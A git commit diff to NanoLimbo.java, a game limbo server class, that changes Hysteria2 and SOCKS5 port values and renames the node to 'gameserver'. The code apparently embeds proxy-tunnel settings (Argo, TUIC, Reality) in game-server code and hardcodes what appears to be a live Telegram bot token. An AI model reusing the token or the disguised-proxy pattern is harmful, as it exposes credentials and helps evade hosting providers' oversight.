f972b68163b3cb2f326ed0cc987d7519c2c82b42
pingmike2 <166621491+pingmike2@users.noreply.github.com>
2026-03-29 20:47:44 +0800

    Update NanoLimbo.java

--- src/main/java/ua/nanit/limbo/NanoLimbo.java
+++ src/main/java/ua/nanit/limbo/NanoLimbo.java
@@ -161,8 +161,8 @@ public final class NanoLimbo {
         envVars.put("ARGO_PORT", "8001");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "50077");
-        envVars.put("S5_PORT", "50077");
+        envVars.put("HY2_PORT", "27618");
+        envVars.put("S5_PORT", "27618");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
@@ -171,7 +171,7 @@ public final class NanoLimbo {
         envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "2096");
-        envVars.put("NAME", "searcade");
+        envVars.put("NAME", "gameserver");
 
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
